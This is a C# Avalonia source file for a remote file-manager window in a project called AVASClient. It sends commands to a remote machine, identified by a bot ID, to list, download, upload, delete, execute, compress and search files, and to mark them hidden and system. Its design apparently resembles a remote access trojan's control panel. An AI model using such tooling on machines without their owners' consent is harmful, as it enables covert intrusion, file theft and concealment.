using Avalonia;
using Avalonia.Controls;
using Avalonia.Markup.Xaml;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using Avalonia.Input;
using Avalonia.Interactivity;
using Avalonia.Media.Imaging;
using AVASClient.MessagePackLib;
using AVASClient.Models;
using Avalonia.Threading;

namespace AVASClient;

public partial class Form_FileManager : Window
{

    public Form_FileManager()
    {
        InitializeComponent();
        // 事件改为在 XAML 里声明
    }
    public string BID { get; set; }
    private const string DLLINFO = "FileManager";
    //============================绑定的字段
    private ObservableCollection<FileItem> _items = new ObservableCollection<FileItem>();  //绑定的文件列表信息
    private string _currentPath;        //当前路径
    private readonly Stack<string> _backStack = new Stack<string>();            //后退栈
    private readonly Stack<string> _forwardStack = new Stack<string>();         //前进栈
    private int _pendingDownloads = 0;            //待下载数量
    private int _completedDownloads = 0;          //已完成数量
    private bool _isDownloading = false;          //是否存在下载任务
    private readonly Dictionary<string, long> _downloadTotalByFile = new Dictionary<string, long>();
    private readonly Dictionary<string, long> _downloadReceivedByFile = new Dictionary<string, long>();
    private int _activeDownloadFiles = 0;

    //============================
    public Form_FileManager(string _BID)
    {
        BID = _BID;
        InitializeComponent();
        // 事件改为在 XAML 里声明
    }

    protected override void OnOpened(EventArgs e)//窗口打开时加载
    {
        base.OnOpened(e);
        if (FilesGrid != null)
        {
            FilesGrid.ItemsSource = _items;
        }
        // 远程获取驱动器
        SendGetDrivers();
    }

    // XAML 事件处理
    private void BtnBack_OnClick(object? sender, RoutedEventArgs e) => NavigateBack();
    private void BtnForward_OnClick(object? sender, RoutedEventArgs e) => NavigateForward();
    private void BtnUp_OnClick(object? sender, RoutedEventArgs e) => NavigateUp();
    private void BtnRefresh_OnClick(object? sender, RoutedEventArgs e) => RefreshCurrent();
    private void BtnNewFolder_OnClick(object? sender, RoutedEventArgs e) => BtnNewFolderOnClick(sender, e);
    private void BtnSearch_OnClick(object? sender, RoutedEventArgs e) => ApplySearch(SearchBox?.Text);
    private void AddressBox_OnKeyDown(object? sender, KeyEventArgs e)
    {
        if (e.Key == Key.Enter)
        {
            // 远程跳转到输入路径
            if (!string.IsNullOrWhiteSpace(AddressBox?.Text))
            {
                NavigateToRemote(AddressBox!.Text!, true);
            }
        }
    }
    private void FilesGrid_OnDoubleTapped(object? sender, RoutedEventArgs e) => FilesGridOnDoubleTapped(sender, e);
    private void FilesGrid_OnSelectionChanged(object? sender, SelectionChangedEventArgs e) => FilesGridOnSelectionChanged(sender, e);

    // =====================================
    // 发送请求到服务器（插件 FileManager）
    // =====================================
    private void SendGetDrivers()
    {
        try
        {
            ClientMsgPack clientMsgPack = new ClientMsgPack();
            clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
            clientMsgPack.ForcePathObject("BID").SetAsString(BID);
            clientMsgPack.ForcePathObject("Pac_ket").AsString = "GetDrivers";
            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
        }
        catch { }
    }

    private void SendGetPath(string path)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(path)) return;
            path = NormalizePath(path);
            ClientMsgPack clientMsgPack = new ClientMsgPack();
            clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
            clientMsgPack.ForcePathObject("BID").SetAsString(BID);
            clientMsgPack.ForcePathObject("Pac_ket").AsString = "GetPath";
            clientMsgPack.ForcePathObject("Path").AsString = path;
            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
        }
        catch { }
    }

    // 供 HandleFileManager 调用以回填数据
    public void UpdateItemsFromRemote(IEnumerable<FileItem> items, string currentPath)
    {
        _items.Clear();
        foreach (var it in items)
        {
            _items.Add(it);
        }
        _currentPath = NormalizePath(currentPath);
        ResetGridBinding();
        UpdateAddressAndStatus();
    }

    public string CurrentPath => _currentPath;

    public void RequestRefreshFromRemote()
    {
        if (string.IsNullOrWhiteSpace(_currentPath))
        {
            SendGetDrivers();
        }
        else
        {
            SendGetPath(_currentPath);
        }
    }

    // ================= 右键菜单 =================
    private void Ctx_NewFolder_OnClick(object? sender, RoutedEventArgs e)
    {
        BtnNewFolderOnClick(sender, e);
    }

    private void Ctx_Run_OnClick(object? sender, RoutedEventArgs e)
    {
        var selection = FilesGrid?.SelectedItems?.Cast<FileItem>().ToList();
        if (selection == null || selection.Count == 0) return;
        var file = selection.FirstOrDefault(i => !i.IsDirectory);
        if (file == null) return;
        SendExecute(file.FullPath);
    }

    private void Ctx_Download_OnClick(object? sender, RoutedEventArgs e)
    {
        var selection = FilesGrid?.SelectedItems?.Cast<FileItem>().ToList();
        if (selection == null || selection.Count == 0) return;
        _pendingDownloads += selection.Count;
        _isDownloading = true;
        Dispatcher.UIThread.Post(() =>
        {
            if (DownloadProgress != null)
            {
                DownloadProgress.IsVisible = true;
                if (DownloadProgress.Value < 0) DownloadProgress.Value = 0;
            }
            if (DownloadProgressText != null)
            {
                DownloadProgressText.IsVisible = true;
                DownloadProgressText.Text = $"{_pendingDownloads - _completedDownloads} 个文件下载中...";
            }
        });
        Settings._manager?.Show(new Avalonia.Controls.Notifications.Notification("下载", $"开始下载 {selection.Count} 项（队列共 {_pendingDownloads}）", Avalonia.Controls.Notifications.NotificationType.Information));
        foreach (var it in selection)
        {
            string fname = System.IO.Path.GetFileName(it.FullPath);
            if (!_downloadTotalByFile.ContainsKey(fname))
            {
                _downloadTotalByFile[fname] = 0;
                _downloadReceivedByFile[fname] = 0;
                _activeDownloadFiles++;
            }
            SendDownload(it.FullPath, it.IsDirectory, 0);
        }
        UpdateAggregateProgressUI();
    }

    private void Ctx_Delete_OnClick(object? sender, RoutedEventArgs e)
    {
        var selection = FilesGrid?.SelectedItems?.Cast<FileItem>().ToList();
        if (selection == null || selection.Count == 0) return;
        foreach (var it in selection)
        {
            SendDelete(it.FullPath, it.IsDirectory);
        }
    }

    private void Ctx_HideSingle_OnClick(object? sender, RoutedEventArgs e)
    {
        var selection = FilesGrid?.SelectedItems?.Cast<FileItem>().ToList();
        if (selection == null || selection.Count == 0) return;
        foreach (var it in selection)
        {
            SendSetAttr(it.FullPath, it.IsDirectory, hidden:true, system:false);
        }
    }

    private void Ctx_HideSystem_OnClick(object? sender, RoutedEventArgs e)
    {
        var selection = FilesGrid?.SelectedItems?.Cast<FileItem>().ToList();
        if (selection == null || selection.Count == 0) return;
        foreach (var it in selection)
        {
            SendSetAttr(it.FullPath, it.IsDirectory, hidden:true, system:true);
        }
    }

    private void Ctx_Upload_OnClick(object? sender, RoutedEventArgs e)
    {
        // 打开本地选择对话框
        var dialog = new OpenFileDialog();
        dialog.AllowMultiple = true;
        var task = dialog.ShowAsync(this);
        task.ContinueWith(t =>
        {
            var files = t.Result;
            if (files == null || files.Length == 0) return;
            foreach (var f in files)
            {
                SendUpload(_currentPath ?? string.Empty, f);
            }
        });
    }

    private void Ctx_Compress_OnClick(object? sender, RoutedEventArgs e)
    {
        var selection = FilesGrid?.SelectedItems?.Cast<FileItem>().ToList();
        if (selection == null || selection.Count == 0) return;
        SendCompress(_currentPath ?? string.Empty, selection.Select(s => s.FullPath).ToList());
    }

    private void Ctx_JumpToLocation_OnClick(object? sender, RoutedEventArgs e)
    {
        var item = FilesGrid?.SelectedItem as FileItem;
        if (item == null) return;
        string dir = item.IsDirectory ? item.FullPath : System.IO.Path.GetDirectoryName(item.FullPath) ?? _currentPath;
        if (string.IsNullOrWhiteSpace(dir)) return;
        NavigateToRemote(dir, true);
    }

    // ================= 发送协议 =================
    private void SendCreateFolder(string parentPath)
    {
        if (string.IsNullOrWhiteSpace(parentPath)) return;
        ClientMsgPack msg = new ClientMsgPack();
        msg.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
        msg.ForcePathObject("BID").SetAsString(BID);
        msg.ForcePathObject("Pac_ket").AsString = "CreateFolder";
        msg.ForcePathObject("Path").AsString = parentPath;
        Settings.client?.SendFramed(msg.Encode2Bytes());
    }

    private void SendExecute(string filePath)
    {
        ClientMsgPack msg = new ClientMsgPack();
        msg.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
        msg.ForcePathObject("BID").SetAsString(BID);
        msg.ForcePathObject("Pac_ket").AsString = "Execute";
        msg.ForcePathObject("Path").AsString = filePath;
        Settings.client?.SendFramed(msg.Encode2Bytes());
    }

    private void SendDownload(string path, bool isDir, long resumeOffset)
    {
        ClientMsgPack msg = new ClientMsgPack();
        msg.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
        msg.ForcePathObject("BID").SetAsString(BID);
        msg.ForcePathObject("Pac_ket").AsString = "Download";
        msg.ForcePathObject("Path").AsString = NormalizePath(path);
        msg.ForcePathObject("IsDir").AsInteger = isDir ? 1 : 0;
        msg.ForcePathObject("ResumeOffset").AsInteger = resumeOffset;
        Settings.client?.SendFramed(msg.Encode2Bytes());
    }

    private void SendDelete(string path, bool isDir)
    {
        ClientMsgPack msg = new ClientMsgPack();
        msg.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
        msg.ForcePathObject("BID").SetAsString(BID);
        msg.ForcePathObject("Pac_ket").AsString = "Delete";
        msg.ForcePathObject("Path").AsString = NormalizePath(path);
        msg.ForcePathObject("IsDir").AsInteger = isDir ? 1 : 0;
        Settings.client?.SendFramed(msg.Encode2Bytes());
    }

    private void SendSetAttr(string path, bool isDir, bool hidden, bool system)
    {
        ClientMsgPack msg = new ClientMsgPack();
        msg.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
        msg.ForcePathObject("BID").SetAsString(BID);
        msg.ForcePathObject("Pac_ket").AsString = "SetAttr";
        msg.ForcePathObject("Path").AsString = NormalizePath(path);
        msg.ForcePathObject("IsDir").AsInteger = isDir ? 1 : 0;
        msg.ForcePathObject("Hidden").AsInteger = hidden ? 1 : 0;
        msg.ForcePathObject("System").AsInteger = system ? 1 : 0;
        Settings.client?.SendFramed(msg.Encode2Bytes());
    }

    private void SendUpload(string remoteDir, string localFile)
    {
        if (!System.IO.File.Exists(localFile)) return;
        ClientMsgPack msg = new ClientMsgPack();
        msg.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
        msg.ForcePathObject("BID").SetAsString(BID);
        msg.ForcePathObject("Pac_ket").AsString = "Upload";
        msg.ForcePathObject("RemoteDir").AsString = NormalizePath(remoteDir);
        msg.ForcePathObject("FileName").AsString = System.IO.Path.GetFileName(localFile);
        msg.ForcePathObject("Data").SetAsBytes(System.IO.File.ReadAllBytes(localFile));
        Settings.client?.SendFramed(msg.Encode2Bytes());
    }

    private void SendCompress(string baseDir, List<string> paths)
    {
        ClientMsgPack msg = new ClientMsgPack();
        msg.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
        msg.ForcePathObject("BID").SetAsString(BID);
        msg.ForcePathObject("Pac_ket").AsString = "Compress";
        msg.ForcePathObject("BaseDir").AsString = NormalizePath(baseDir);
        msg.ForcePathObject("Paths").AsString = string.Join("|", paths.Select(NormalizePath));
        Settings.client?.SendFramed(msg.Encode2Bytes());
    }

    private void SendSearch(string basePath, string? keyword)
    {
        if (string.IsNullOrWhiteSpace(keyword)) return;
        ClientMsgPack msg = new ClientMsgPack();
        msg.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
        msg.ForcePathObject("BID").SetAsString(BID);
        msg.ForcePathObject("Pac_ket").AsString = "Search";
        msg.ForcePathObject("BasePath").AsString = string.IsNullOrWhiteSpace(basePath) ? _currentPath ?? string.Empty : NormalizePath(basePath);
        msg.ForcePathObject("Keyword").AsString = keyword;
        Settings.client?.SendFramed(msg.Encode2Bytes());
    }

    // 下载进度（由 HandleFileManager 调用）
    public void OnDownloadItemCompleted(string fileName, long bytes)
    {
        // 标记该文件完成并从聚合中移除
        if (!string.IsNullOrEmpty(fileName))
        {
            _downloadReceivedByFile[fileName] = bytes > 0 ? bytes : _downloadReceivedByFile.GetValueOrDefault(fileName);
            _downloadTotalByFile[fileName] = Math.Max(_downloadTotalByFile.GetValueOrDefault(fileName), bytes);
            if (_activeDownloadFiles > 0) _activeDownloadFiles--;
        }
        _completedDownloads++;
        UpdateAggregateProgressUI();
    }

    // 分片进度（不计完成数，只更新条和文本）
    public void OnDownloadChunkProgress(string fileName, long transferred, long total)
    {
        if (total <= 0) return;
        _downloadTotalByFile[fileName] = total;
        _downloadReceivedByFile[fileName] = Math.Max(_downloadReceivedByFile.GetValueOrDefault(fileName), transferred);
        UpdateAggregateProgressUI();
    }

    private void UpdateAggregateProgressUI()
    {
        long sumTotal = 0;
        long sumRecv = 0;
        foreach (var kv in _downloadTotalByFile)
        {
            sumTotal += Math.Max(0, kv.Value);
        }
        foreach (var kv in _downloadReceivedByFile)
        {
            sumRecv += Math.Max(0, kv.Value);
        }
        int percent = (sumTotal > 0) ? (int)Math.Max(0, Math.Min(100, Math.Round(100.0 * sumRecv / sumTotal))) : 0;
        int remainingFiles = Math.Max(0, _pendingDownloads - _completedDownloads);
        Dispatcher.UIThread.Post(() =>
        {
            if (DownloadProgress != null)
            {
                DownloadProgress.IsVisible = remainingFiles > 0 || sumRecv < sumTotal;
                DownloadProgress.Value = percent;
            }
            if (DownloadProgressText != null)
            {
                DownloadProgressText.IsVisible = DownloadProgress.IsVisible;
                DownloadProgressText.Text = remainingFiles > 0
                    ? $"{remainingFiles} 个文件下载中... {percent}%"
                    : (sumTotal > 0 && sumRecv >= sumTotal ? "下载完成" : "");
            }
            if (!DownloadProgress.IsVisible)
            {
                // 清理聚合状态
                _downloadTotalByFile.Clear();
                _downloadReceivedByFile.Clear();
                _pendingDownloads = 0;
                _completedDownloads = 0;
                _activeDownloadFiles = 0;
                _isDownloading = false;
                Settings._manager?.Show(new Avalonia.Controls.Notifications.Notification("下载", "全部下载完成", Avalonia.Controls.Notifications.NotificationType.Success));
                UpdateAddressAndStatus();
            }
        });
    }

    private void FilesGridOnSelectionChanged(object? sender, SelectionChangedEventArgs e)
    {
        if (SelectionText != null && sender is DataGrid dg)
        {
            SelectionText.Text = (dg.SelectedItems?.Count ?? 0).ToString() + " 项";
        }
    }

    private void FilesGridOnDoubleTapped(object? sender, RoutedEventArgs e)
    {
        if (sender is not DataGrid grid) return;
        var item = grid.SelectedItem as FileItem;
        if (item == null) return;
        if (item.IsDirectory)
        {
            // 远程进入目录
            NavigateToRemote(item.FullPath, true);
        }
        else
        {
            // 文件双击暂不处理（避免意外执行）
        }
    }

    private void BtnNewFolderOnClick(object? sender, RoutedEventArgs e)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(_currentPath) || !Directory.Exists(_currentPath)) return;
            string baseName = "新建文件夹";
            string newPath = Path.Combine(_currentPath, baseName);
            int index = 1;
            while (Directory.Exists(newPath))
            {
                newPath = Path.Combine(_currentPath, $"{baseName} ({index++})");
            }
            Directory.CreateDirectory(newPath);
            RefreshCurrent();
        }
        catch { }
    }

    private void ApplySearch(string? keyword)
    {
        if (string.IsNullOrWhiteSpace(keyword))
        {
            RequestRefreshFromRemote();
            return;
        }
        // 远程搜索（支持通配符/正则）
        SendSearch(_currentPath ?? string.Empty, keyword);
    }

    private void NavigateBack()
    {
        if (_backStack.Count == 0) return;
        string prev = _backStack.Pop();
        if (!string.IsNullOrEmpty(_currentPath)) _forwardStack.Push(_currentPath);
        SendGetPath(prev);
    }

    private void NavigateForward()
    {
        if (_forwardStack.Count == 0) return;
        string next = _forwardStack.Pop();
        if (!string.IsNullOrEmpty(_currentPath)) _backStack.Push(_currentPath);
        SendGetPath(next);
    }

    private void NavigateUp()
    {
        if (string.IsNullOrWhiteSpace(_currentPath)) { SendGetDrivers(); return; }
        try
        {
            // 远程导航：不要用本地 Directory.GetParent
            // 根目录或盘符上一级应回到驱动器列表
            if (IsRootLike(_currentPath)) { SendGetDrivers(); return; }
            string parentPath = GetParentRemote(_currentPath);
            if (string.IsNullOrEmpty(parentPath)) { SendGetDrivers(); return; }
            NavigateToRemote(parentPath, true);
        }
        catch { }
    }

    private void RefreshCurrent()
    {
        if (string.IsNullOrWhiteSpace(_currentPath)) SendGetDrivers();
        else SendGetPath(_currentPath);
    }

    private void NavigateTo(string? path, bool pushHistory = true)
    {
        if (string.IsNullOrWhiteSpace(path)) return;
        try
        {
            if (Directory.Exists(path))
            {
                if (pushHistory && !string.IsNullOrWhiteSpace(_currentPath))
                {
                    _backStack.Push(_currentPath);
                    _forwardStack.Clear();
                }
                LoadPath(path);
            }
        }
        catch { }
    }

    private void NavigateToRemote(string path, bool pushHistory)
    {
        if (string.IsNullOrWhiteSpace(path)) return;
        path = NormalizePath(path);
        if (pushHistory && !string.IsNullOrWhiteSpace(_currentPath))
        {
            _backStack.Push(_currentPath);
            _forwardStack.Clear();
        }
        SendGetPath(path);
    }

    //private void LoadDrives()
    //{
    //    _items.Clear();
    //    try
    //    {
    //        foreach (var drive in DriveInfo.GetDrives().Where(d => d.IsReady))
    //        {
    //            _items.Add(new FileItem
    //            {
    //                Name = drive.Name,
    //                Type = "驱动器",
    //                DateModified = string.Empty,
    //                SizeDisplay = FormatSizeSafe(drive.TotalSize),
    //                IsDirectory = true,
    //                FullPath = drive.RootDirectory.FullName,
    //                Icon = null,
    //                IconGlyph = "?"
    //            });
    //        }
    //    }
    //    catch { }
    //    _currentPath = string.Empty;
    //    UpdateAddressAndStatus();
    //    ResetGridBinding();
    //}

    private void LoadPath(string path)
    {
        // 本地加载列表是旧实现，会误用本机文件系统。保留方法用于旧路径设置，但不再读取本地磁盘。
        _currentPath = NormalizePath(path);
        UpdateAddressAndStatus();
        ResetGridBinding();
    }

    private void ResetGridBinding()
    {
        if (FilesGrid != null)
        {
            FilesGrid.ItemsSource = null;
            FilesGrid.ItemsSource = _items;
        }
    }

    private void UpdateAddressAndStatus()
    {
        if (AddressBox != null) AddressBox.Text = string.IsNullOrWhiteSpace(_currentPath) ? "" : NormalizePath(_currentPath);
        if (StatusText != null) StatusText.Text = _items.Count + " 项";
        if (SelectionText != null) SelectionText.Text = "0 项";
    }

    private static string FormatSizeSafe(long bytes)
    {
        try
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return string.Format(System.Globalization.CultureInfo.InvariantCulture, "{0:0.##} {1}", len, sizes[order]);
        }
        catch { return bytes.ToString(); }
    }

    private void Window_Loaded(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
    {
        //刷新文件列表
        if (string.IsNullOrWhiteSpace(_currentPath)) SendGetDrivers();
        else SendGetPath(_currentPath);
    }

    private void Window_Closed(object? sender, System.EventArgs e)
    {
        //发送停止信息
        try
        {
            ClientMsgPack clientMsgPack = new ClientMsgPack();
            clientMsgPack.ForcePathObject("DLLINFO").SetAsString(DLLINFO);
            clientMsgPack.ForcePathObject("BID").SetAsString(BID);
            clientMsgPack.ForcePathObject("Pac_ket").AsString = "Stop";
            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
        }
        catch { }
    }

    private static string NormalizePath(string path)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(path)) return string.Empty;
            bool isWin = IsWindowsPath(path);
            string p = path.Trim();
            if (isWin)
            {
                p = p.Replace('/', '\\');
                while (p.Contains("\\\\")) p = p.Replace("\\\\", "\\");
                if (p.Length == 2 && char.IsLetter(p[0]) && p[1] == ':') p += "\\";
                return p;
            }
            else
            {
                p = p.Replace('\\', '/');
                while (p.Contains("//")) p = p.Replace("//", "/");
                if (string.IsNullOrEmpty(p)) p = "/";
                return p;
            }
        }
        catch { return path; }
    }

    private static bool IsRootLike(string path)
    {
        try
        {
            if (string.IsNullOrEmpty(path)) return true;
            if (IsWindowsPath(path))
            {
                var p = path.TrimEnd('\\', '/');
                return p.Length == 2 && char.IsLetter(p[0]) && p[1] == ':';
            }
            var p2 = path.TrimEnd('/');
            return string.IsNullOrEmpty(p2) || p2 == "/";
        }
        catch { return false; }
    }

    private static bool IsWindowsPath(string path)
    {
        try
        {
            if (string.IsNullOrEmpty(path)) return false;
            if (path.Length >= 2 && char.IsLetter(path[0]) && path[1] == ':') return true;
            if (path.StartsWith("\\\\")) return true;
            if (path.Contains('\\')) return true;
            return false;
        }
        catch { return false; }
    }

    private static string GetParentRemote(string path)
    {
        try
        {
            if (IsWindowsPath(path))
            {
                string p = NormalizePath(path).TrimEnd('\\');
                if (p.Length <= 3 && p.EndsWith("\\") && char.IsLetter(p[0]) && p[1] == ':') return string.Empty;
                int idx = p.LastIndexOf('\\');
                if (idx <= 2) return p.Substring(0, 3); // D:\
                return p.Substring(0, idx + 1);
            }
            else
            {
                string p = NormalizePath(path);
                if (p == "/") return string.Empty;
                int idx = p.LastIndexOf('/');
                if (idx <= 0) return "/";
                string parent = p.Substring(0, idx);
                if (string.IsNullOrEmpty(parent)) parent = "/";
                return parent;
            }
        }
        catch { return string.Empty; }
    }
}
public class FileItem
{
    public string Name { get; set; }
    public string Type { get; set; }
    public string DateModified { get; set; }
    public string SizeDisplay { get; set; }
    public bool IsDirectory { get; set; }
    public string FullPath { get; set; }
    public Bitmap Icon { get; set; }
    public string IconGlyph { get; set; }
}